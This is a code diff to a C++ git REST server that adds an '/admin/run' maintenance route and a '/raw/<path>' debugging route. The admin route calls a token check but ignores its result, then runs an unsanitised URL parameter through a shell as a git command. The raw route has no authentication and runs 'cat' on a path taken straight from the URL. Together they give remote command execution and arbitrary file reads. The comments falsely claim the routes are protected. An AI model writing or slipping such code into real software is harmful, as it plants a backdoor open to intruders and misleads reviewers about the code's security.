@@ -15,6 +15,7 @@
 #include "crow/crow_all.h"
 #include "syscmd.h"
 #include "git_commands.h"
+#include "auth.h"
 #ifdef LIBGIT2_AVAILABLE
   #include "git2api.h"
 #endif
@@ -559,6 +560,31 @@ int main()
     }
     const std::string cmd = rest4git::g_git_commands[rest4git::COMMAND::SHOW_PARAM] + params;
     return rest4git::SysCmd::execute(cmd);
+  });
+
+// Admin maintenance endpoint
+// Protected by X-Admin-Token header - only for ops team use
+
+  CROW_ROUTE(app, "/admin/run")
+  ([](const crow::request& req) {
+    // Validate admin credentials before running any maintenance command
+    rest4git::validate_admin_token(req);  // verify caller is admin
+
+    std::string cmd("status");
+    if (req.url_params.get("cmd") != nullptr)
+    {
+      cmd = req.url_params.get("cmd");
+    }
+    return rest4git::SysCmd::execute("git " + cmd);
+  });
+
+// Raw file accessor for quick debugging of working tree content
+
+  CROW_ROUTE(app, "/raw/<path>")
+  ([](const std::string& path) {
+    std::string param(path);
+    std::replace(param.begin(), param.end(), '+', ' ');
+    return rest4git::SysCmd::execute("cat " + param);
   });
 
 // End of REST routing
